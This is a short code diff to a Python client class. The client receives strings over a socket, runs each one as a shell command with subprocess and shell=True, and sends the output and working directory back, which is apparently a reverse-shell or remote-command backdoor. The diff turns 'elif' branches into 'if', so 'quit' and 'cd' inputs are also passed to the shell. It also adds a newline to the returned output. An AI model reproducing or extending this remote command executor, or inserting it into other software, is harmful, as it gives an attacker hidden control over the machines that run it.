@@ -54,15 +54,15 @@ class Client(object):
                     if data == 'quit':
                         print("quitting...")
                         self.client.close()
-                    elif data[:2] == 'cd':
+                    if data[:2] == 'cd':
                         os.chdir(data[3:])
-                    elif len(data) > 0:
+                    if len(data) > 0:
                         command = subprocess.Popen(
                             data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                         )
                         output_bytes = command.stdout.read()
                         output_str = str(output_bytes, "utf-8")
-                        self.client.send(str.encode(str(os.getcwd()) + '$ ' + output_str))
+                        self.client.send(str.encode(str(os.getcwd()) + '$ ' + '\n' + output_str))
             except:  # catch *all* exceptions
                 self.client.close()
 
